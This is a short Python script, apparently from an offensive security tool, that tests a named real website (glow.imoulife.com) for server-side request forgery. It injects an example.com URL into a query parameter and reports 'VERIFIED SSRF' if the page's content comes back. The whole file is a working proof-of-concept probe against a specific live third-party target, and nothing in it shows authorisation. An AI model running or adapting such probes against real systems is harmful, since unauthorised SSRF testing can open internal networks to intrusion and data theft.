import asyncio
import httpx
from aura.ui.formatter import console

async def imou_proof(url):
    console.print(f"[*] FINAL PROOF: Auditing {url}")
    try:
        async with httpx.AsyncClient(verify=False, timeout=15) as client:
            r = await client.get(url)
            if r.status_code == 200:
                content = r.text
                if "<!doctype html" in content.lower() or "<html" in content.lower():
                    console.print(f"  [red][!] FAIL: Content is HTML (Ghost Hit).[/red]")
                    return False
                
                # If it's real SSRF, it should contain content from example.com or whatever we request
                if "Example Domain" in content or "iana" in content:
                    console.print(f"  [bold red][!!!] VERIFIED SSRF: {url}[/bold red]")
                    return True
                else:
                    console.print(f"  [yellow][.] Content is not recognizable SSRF output.[/yellow]")
                    console.print(f"    -> Preview: {content[:200]}")
            else:
                console.print(f"  [red][!] Status Code: {r.status_code}[/red]")
    except Exception as e:
        console.print(f"  [red][!] Connection Error: {e}[/red]")
    return False

if __name__ == "__main__":
    url = "https://glow.imoulife.com/?url=http://example.com"
    asyncio.run(imou_proof(url))
